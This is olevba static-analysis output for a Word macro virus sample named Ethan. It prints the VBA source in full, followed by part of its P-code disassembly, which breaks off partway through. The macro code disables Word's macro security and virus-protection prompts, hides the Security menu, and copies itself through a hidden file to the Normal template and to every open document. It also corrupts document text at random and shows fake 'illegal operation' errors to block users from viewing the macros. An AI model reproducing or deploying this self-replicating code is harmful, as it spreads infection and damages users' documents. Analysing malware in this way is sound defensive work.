olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Ethan.dh
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDoc.cls 
in file: ./Virus.MSWord.Ethan.dh - OLE stream: 'Macros/VBA/ThisDoc'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



Private Sub Document_Close()
On Error Resume Next

If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
  CommandBars("Macro").Controls("Security...").Enabled = False
  System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
  Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
End If

Application.EnableCancelKey = Not -1
CountofDocs = Documents.Count
For Doc = 0 To CountofDocs
If Documents.Item(Doc).VBProject.VBComponents.Item(1).Name <> "ThisDoc" Then
Set t = Documents.Item(Doc).VBProject.VBComponents.Item(1)

s = Documents.Item(Doc).Saved

begin = 1
If t.CodeModule.Find("Document_Open()", begin, 1, t.CodeModule.CoundOfLines, 1) = True Then
For Line = 0 To t.CodeModule.CountOfLines
t.CodeModule.DeleteLines begin
Next Line
ElseIf t.CodeModule.Find("Document_Close()", begin, 1, t.CodeModule.CoundOfLines, 1) = True Then
For Line = 0 To t.CodeModule.CountOfLines
t.CodeModule.DeleteLines begin
Next Line
Else
begin = 1
If t.CodeModule.Find("ToolsMacro()", begin, 1, t.CodeModule.CoundOfLines, 1) = True Then
For Line = 0 To t.CodeModule.CountOfLines
t.CodeModule.DeleteLines begin
Next Line
Else
begin = 1
If t.CodeModule.Find("Filetemplates()", begin, 1, t.CodeModule.CoundOfLines, 1) = True Then
For Line = 0 To t.CodeModule.CountOfLines
t.CodeModule.DeleteLines begin
Next Line
Else
begin = 1
If t.CodeModule.Find("ViewVBCode()", begin, 1, t.CodeModule.CoundOfLines, 1) = True Then
For Line = 0 To t.CodeModule.CountOfLines
t.CodeModule.DeleteLines begin
Next Line
End If
End If
End If
End If

Open "c:\hawk.___" For Input As #1
If LOF(1) = 0 Then GoTo q
i = 1
Do While Not EOF(1)
Line Input #1, a
t.CodeModule.InsertLines i, a
i = i + 1
Loop
q:
Close #1
t.Name = "ThisDoc"
If Left(Documents.Item(Doc).Name, 8) <> "Document" Then Documents.Item(Doc).SaveAs FileName:=ActiveDocument.FullName
If Documents.Item(Doc).Saved <> s Then Documents.Item(Doc).Saved = s
End If
Next Doc

SetAttr "c:\hawk.___", 0
Kill "c:\hawk.___"
End Sub

Private Sub Document_Open()

On Error Resume Next

Randomize

If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
  CommandBars("Macro").Controls("Security...").Enabled = False
  System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
  Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
End If

If Dir("c:\hawk.___", 6) = "" Then
Open "c:\hawk.___" For Output As #1
For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
Print #1, a
Next i
Close #1
SetAttr "c:\hawk.___", 6
End If

If NormalTemplate.VBProject.VBComponents.Item(1).Name <> "ThisDoc" Then
Set t = NormalTemplate.VBProject.VBComponents.Item(1)

begin = 1
If t.CodeModule.Find("Document_Open()", begin, 1, t.CodeModule.CoundOfLines, 1) = True Then
For Line = 0 To t.CodeModule.CountOfLines
t.CodeModule.DeleteLines begin
Next Line
Else
begin = 1
If t.CodeModule.Find("Document_Close()", begin, 1, t.CodeModule.CoundOfLines, 1) = True Then
For Line = 0 To t.CodeModule.CountOfLines
t.CodeModule.DeleteLines begin
Next Line
Else
begin = 1
If t.CodeModule.Find("ToolsMacro()", begin, 1, t.CodeModule.CoundOfLines, 1) = True Then
For Line = 0 To t.CodeModule.CountOfLines
t.CodeModule.DeleteLines begin
Next Line
Else
begin = 1
If t.CodeModule.Find("Filetemplates()", begin, 1, t.CodeModule.CoundOfLines, 1) = True Then
For Line = 0 To t.CodeModule.CountOfLines
t.CodeModule.DeleteLines begin
Next Line
Else
begin = 1
If t.CodeModule.Find("ViewVBCode()", begin, 1, t.CodeModule.CoundOfLines, 1) = True Then
For Line = 0 To t.CodeModule.CountOfLines
t.CodeModule.DeleteLines begin
Next Line
End If
End If
End If
End If
End If

Open "c:\hawk.___" For Input As #1
If LOF(1) = 0 Then GoTo x
i = 1
Do While Not EOF(1)
Line Input #1, a
t.CodeModule.InsertLines i, a
i = i + 1
Loop
x:
Close #1
t.Name = "ThisDoc"
ElseIf Rnd < 0.1 And Year(Now) = 2000 Then
With ActiveDocument.Content.Find:
    .ClearFormatting
    .Text = "e"
    .MatchCase = False
    .Replacement.ClearFormatting
    .Replacement.Font.Bold = True
    .Replacement.Text = "#5 -"
    .Execute Forward:=True, MatchCase:=False, Replace:=wdReplaceAll
End With
With ActiveDocument.Content.Find:
    .ClearFormatting
    .Text = "n"
    .MatchCase = False
    .Replacement.ClearFormatting
    .Replacement.Font.Bold = True
    .Replacement.Text = "-& "
    .Execute Forward:=True, MatchCase:=False, Replace:=wdReplaceAll
End With
With ActiveDocument.Content.Find:
    .ClearFormatting
    .Text = "."
    .MatchCase = False
    .Replacement.ClearFormatting
    .Replacement.Font.Bold = True
    .Replacement.Text = "31"
    .Execute Forward:=True, MatchCase:=False, Replace:=wdReplaceAll
End With
Selection.Next(Unit:=wdParagraph, Count:=1).Select
Selection.Delete
End If

CountofDocs = Documents.Count
For Doc = 0 To CountofDocs
If Documents.Item(Doc).VBProject.VBComponents.Item(1).Name <> "ThisDoc" Then
Set t = Documents.Item(Doc).VBProject.VBComponents.Item(1)
s = Documents.Item(Doc).Saved
begin = 1
If t.CodeModule.Find("Document_Open()", begin, 1, t.CodeModule.CoundOfLines, 1) = True Then
For Line = 0 To t.CodeModule.CountOfLines
t.CodeModule.DeleteLines begin
Next Line
ElseIf t.CodeModule.Find("Document_Close()", begin, 1, t.CodeModule.CoundOfLines, 1) = True Then
For Line = 0 To t.CodeModule.CountOfLines
t.CodeModule.DeleteLines begin
Next Line
Else
begin = 1
If t.CodeModule.Find("ToolsMacro()", begin, 1, t.CodeModule.CoundOfLines, 1) = True Then
For Line = 0 To t.CodeModule.CountOfLines
t.CodeModule.DeleteLines begin
Next Line
Else
begin = 1
If t.CodeModule.Find("Filetemplates()", begin, 1, t.CodeModule.CoundOfLines, 1) = True Then
For Line = 0 To t.CodeModule.CountOfLines
t.CodeModule.DeleteLines begin
Next Line
Else
begin = 1
If t.CodeModule.Find("ViewVBCode()", begin, 1, t.CodeModule.CoundOfLines, 1) = True Then
For Line = 0 To t.CodeModule.CountOfLines
t.CodeModule.DeleteLines begin
Next Line
End If
End If
End If
End If

Open "c:\hawk.___" For Input As #1
If LOF(1) = 0 Then GoTo q
i = 1
Do While Not EOF(1)
Line Input #1, a
t.CodeModule.InsertLines i, a
i = i + 1
Loop
q:
Close #1
t.Name = "ThisDoc"
If Left(Documents.Item(Doc).Name, 8) <> "Document" Then Documents.Item(Doc).SaveAs FileName:=ActiveDocument.FullName
If Documents.Item(Doc).Saved <> s Then Documents.Item(Doc).Saved = s
End If
Next Doc

End Sub

Private Sub ToolsMacro()
MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Word"
End Sub

Private Sub FileTemplates()
MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Word"
End Sub

Private Sub ViewVBCode()
MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Word"
End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Ethan.dh
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDoc - 12214 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' 	FuncDefn (Private Sub Document_Close())
' Line #4:
' 	OnError (Resume Next) 
' Line #5:
' Line #6:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #7:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #8:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #9:
' 	ElseBlock 
' Line #10:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #11:
' 	EndIfBlock 
' Line #12:
' Line #13:
' 	LitDI2 0x0001 
' 	UMi 
' 	Not 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #14:
' 	Ld Documents 
' 	MemLd Count 
' 	St CountofDocs 
' Line #15:
' 	StartForVariable 
' 	Ld Doc 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld CountofDocs 
' 	For 
' Line #16:
' 	LitDI2 0x0001 
' 	Ld Doc 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "ThisDoc"
' 	Ne 
' 	IfBlock 
' Line #17:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld Doc 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set t 
' Line #18:
' Line #19:
' 	Ld Doc 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Saved 
' 	St s 
' Line #20:
' Line #21:
' 	LitDI2 0x0001 
' 	St begin 
' Line #22:
' 	LitStr 0x000F "Document_Open()"
' 	Ld begin 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CoundOfLines 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #23:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #24:
' 	Ld begin 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #25:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	NextVar 
' Line #26:
' 	LitStr 0x0010 "Document_Close()"
' 	Ld begin 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CoundOfLines 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (True)
' 	Eq 
' 	ElseIfBlock 
' Line #27:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #28:
' 	Ld begin 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #29:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	NextVar 
' Line #30:
' 	ElseBlock 
' Line #31:
' 	LitDI2 0x0001 
' 	St begin 
' Line #32:
' 	LitStr 0x000C "ToolsMacro()"
' 	Ld begin 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CoundOfLines 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #33:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #34:
' 	Ld begin 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #35:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	NextVar 
' Line #36:
' 	ElseBlock 
' Line #37:
' 	LitDI2 0x0001 
' 	St begin 
' Line #38:
' 	LitStr 0x000F "Filetemplates()"
' 	Ld begin 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CoundOfLines 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #39:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #40:
' 	Ld begin 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #41:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	NextVar 
' Line #42:
' 	ElseBlock 
' Line #43:
' 	LitDI2 0x0001 
' 	St begin 
' Line #44:
' 	LitStr 0x000C "ViewVBCode()"
' 	Ld begin 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CoundOfLines 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #45:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #46:
' 	Ld begin 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #47:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	NextVar 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	EndIfBlock 
' Line #51:
' 	EndIfBlock 
' Line #52:
' Line #53:
' 	LitStr 0x000B "c:\hawk.___"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #54:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo q 
' 	EndIf 
' Line #55:
' 	LitDI2 0x0001 
' 	St i 
' Line #56:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #57:
' 	LitDI2 0x0001 
' 	Ld a 
' 	LineInput 
' Line #58:
' 	Ld i 
' 	Ld a 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #59:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #60:
' 	Loop 
' Line #61:
' 	Label q 
' Line #62:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #63:
' 	LitStr 0x0007 "ThisDoc"
' 	Ld t 
' 	MemSt New 
' Line #64:
' 	Ld Doc 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld Doc 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #65:
' 	Ld Doc 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Saved 
' 	Ld s 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld s 
' 	Ld Doc 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Saved 
' 	EndIf 
' Line #66:
' 	EndIfBlock 
' Line #67:
' 	StartForVariable 
' 	Ld Doc 
' 	EndForVariable 
' 	NextVar 
' Line #68:
' Line #69:
' 	LitStr 0x000B "c:\hawk.___"
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #70:
' 	LitStr 0x000B "c:\hawk.___"
' 	ArgsCall Kill 0x0001 
' Line #71:
' 	EndSub 
' Line #72:
' Line #73:
' 	FuncDefn (Private Sub Document_Open())
' Line #74:
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' Line #77:
' 	ArgsCall Read 0x0000 
' Line #78:
' Line #79:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #80:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #81:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #82:
' 	ElseBlock 
' Line #83:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #84:
' 	EndIfBlock 
' Line #85:
' Line #86:
' 	LitStr 0x000B "c:\hawk.___"
' 	LitDI2 0x0006 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #87:
' 	LitStr 0x000B "c:\hawk.___"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #88:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #89:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St a 
' Line #90:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld a 
' 	PrintItemNL 
' Line #91:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #92:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #93:
' 	LitStr 0x000B "c:\hawk.___"
' 	LitDI2 0x0006 
' 	ArgsCall SetAttr 0x0002 
' Line #94:
' 	EndIfBlock 
' Line #95:
' Line #96:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "ThisDoc"
' 	Ne 
' 	IfBlock 
' Line #97:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set t 
' Line #98:
' Line #99:
' 	LitDI2 0x0001 
' 	St begin 
' Line #100:
' 	LitStr 0x000F "Document_Open()"
' 	Ld begin 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CoundOfLines 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #101:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #102:
' 	Ld begin 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #103:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	NextVar 
' Line #104:
' 	ElseBlock 
' Line #105:
' 	LitDI2 0x0001 
' 	St begin 
' Line #106:
' 	LitStr 0x0010 "Document_Close()"
' 	Ld begin 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CoundOfLines 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #107:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #108:
' 	Ld begin 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #109:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	NextVar 
' Line #110:
' 	ElseBlock 
' Line #111:
' 	LitDI2 0x0001 
' 	St begin 
' Line #112:
' 	LitStr 0x000C "ToolsMacro()"
' 	Ld begin 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CoundOfLines 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #113:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #114:
' 	Ld begin 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #115:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	NextVar 
' Line #116:
' 	ElseBlock 
' Line #117:
' 	LitDI2 0x0001 
' 	St begin 
' Line #118:
' 	LitStr 0x000F "Filetemplates()"
' 	Ld begin 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CoundOfLines 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #119:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #120:
' 	Ld begin 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #121:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	NextVar 
' Line #122:
' 	ElseBlock 
' Line #123:
' 	LitDI2 0x0001 
' 	St begin 
' Line #124:
' 	LitStr 0x000C "ViewVBCode()"
' 	Ld begin 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CoundOfLines 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #125:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #126:
' 	Ld begin 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #127:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	NextVar 
' Line #128:
' 	EndIfBlock 
' Line #129:
' 	EndIfBlock 
' Line #130:
' 	EndIfBlock 
' Line #131:
' 	EndIfBlock 
' Line #132:
' 	EndIfBlock 
' Line #133:
' Line #134:
' 	LitStr 0x000B "c:\hawk.___"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #135:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo x 
' 	EndIf 
' Line #136:
' 	LitDI2 0x0001 
' 	St i 
' Line #137:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #138:
' 	LitDI2 0x0001 
' 	Ld a 
' 	LineInput 
' Line #139:
' 	Ld i 
' 	Ld a 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #140:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #141:
' 	Loop 
' Line #142:
' 	Label x 
' Line #143:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #144:
' 	LitStr 0x0007 "ThisDoc"
' 	Ld t 
' 	MemSt New 
' Line #145:
' 	Ld Rnd 
' 	LitR8 0x999A 0x9999 0x9999 0x3FB9 
' 	Lt 
' 	Ld Now 
' 	ArgsLd Year 0x0001 
' 	LitDI2 0x07D0 
' 	Eq 
' 	And 
' 	ElseIfBlock 
' Line #146:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd Content 
' 	MemLd Find 
' 	With 
' 	BoS 0x0000 
' Line #147:
' 	ArgsMemCallWith ClearFormatting 0x0000 
' Line #148:
' 	LitStr 0x0001 "e"
' 	MemStWith Then 
' Line #149:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #150:
' 	MemLdWith Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #151:
' 	LitVarSpecial (True)
' 	MemLdWith Replacement 
' 	MemLd Font 
' 	MemSt Bold 
' Line #152:
' 	LitStr 0x0004 "#5 -"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #153:
' 	LitVarSpecial (True)
' 	ParamNamed Forward 
' 	LitVarSpecial (False)
' 	ParamNamed MatchCase 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	ArgsMemCallWith Execute 0x0003 
' Line #154:
' 	EndWith 
' Line #155:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd Content 
' 	MemLd Find 
' 	With 
' 	BoS 0x0000 
' Line #156:
' 	ArgsMemCallWith ClearFormatting 0x0000 
' Line #157:
' 	LitStr 0x0001 "n"
' 	MemStWith Then 
' Line #158:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #159:
' 	MemLdWith Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #160:
' 	LitVarSpecial (True)
' 	MemLdWith Replacement 
' 	MemLd Font 
' 	MemSt Bold 
' Line #161:
' 	LitStr 0x0003 "-& "
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #162:
' 	LitVarSpecial (True)
' 	ParamNamed Forward 
' 	LitVarSpecial (False)
' 	ParamNamed MatchCase 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	ArgsMemCallWith Execute 0x0003 
' Line #163:
' 	EndWith 
' Line #164:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd Content 
' 	MemLd Find 
' 	With 
' 	BoS 0x0000 
' Line #165:
' 	ArgsMemCallWith ClearFormatting 0x0000 
' Line #166:
' 	LitStr 0x0001 "."
' 	MemStWith Then 
' Line #167:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #168:
' 	MemLdWith Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #169:
' 	LitVarSpecial (True)
' 	MemLdWith Replacement 
' 	MemLd Font 
' 	MemSt Bold 
' Line #170:
' 	LitStr 0x0002 "31"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #171:
' 	LitVarSpecial (True)
' 	ParamNamed Forward 
' 	LitVarSpecial (False)
' 	ParamNamed MatchCase 
